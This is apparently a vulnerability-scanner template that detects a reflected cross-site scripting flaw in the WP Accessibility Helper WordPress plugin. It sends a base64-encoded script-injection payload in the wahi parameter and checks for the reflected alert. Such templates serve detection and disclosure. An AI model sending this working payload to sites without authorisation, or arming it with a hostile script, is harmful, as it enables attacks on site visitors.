id: accessibility-helper-xss
info:
  author: dhiyaneshDK
  description: The plugin does not sanitise and escape the wahi parameter before outputting
    back its base64 decode value in the page, leading to a Reflected Cross-Site Scripting
    issue.
  name: WP Accessibility Helper (WAH) < 0.6.0.7 - Reflected Cross-Site Scripting (XSS)
  reference:
  - https://wpscan.com/vulnerability/7142a538-7c3d-4dd0-bd2c-cbd2efaf53c5
  severity: medium
  tags: xss,wordpress,wp-plugin,wp
requests:
- matchers:
  - part: body
    type: word
    words:
    - var wah_target_src = '';alert(document.domain);//';
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/?wahi=JzthbGVydChkb2N1bWVudC5kb21haW4pOy8v'
